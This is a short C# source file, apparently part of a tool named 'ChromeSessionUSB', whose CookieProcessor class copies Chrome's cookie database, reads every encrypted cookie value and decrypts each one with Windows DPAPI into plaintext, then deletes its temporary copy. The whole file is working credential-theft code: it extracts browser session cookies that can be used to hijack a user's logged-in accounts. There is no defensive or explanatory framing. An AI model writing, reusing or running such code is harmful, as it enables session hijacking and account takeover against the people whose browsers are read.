using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace ChromeSessionUSB
{
    public class CookieProcessor
    {
        public byte[] readCookies(String cookiePath, out List<String> decrypted, String workingFile = ".temp")
        {
            byte[] bytes = File.ReadAllBytes(cookiePath);
            File.WriteAllBytes(workingFile, bytes);
            decrypted = new List<String>();
            using (SQLiteConnection cnn = new SQLiteConnection("data source=\"" + Directory.GetCurrentDirectory() + "\\" + workingFile + "\""))
            {
                cnn.Open();
                using (SQLiteCommand command = new SQLiteCommand("SELECT * FROM cookies ORDER BY encrypted_value;", cnn))
                {
                    using (SQLiteDataReader reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            byte[] hash = (byte[])(reader["encrypted_value"]);
                            decrypted.Add(Encoding.ASCII.GetString(ProtectedData.Unprotect(hash, null, DataProtectionScope.LocalMachine)));
                        }
                    }
                }
                cnn.Close();
            }
            File.Delete(workingFile);
            return bytes;
        }
        public void buildWorkingCopy(String filePath, String workingFile = ".working")
        {
            if (File.Exists(workingFile))
            {
                File.Delete(workingFile);
            }
            File.Copy(filePath, workingFile);
        }
    }
}
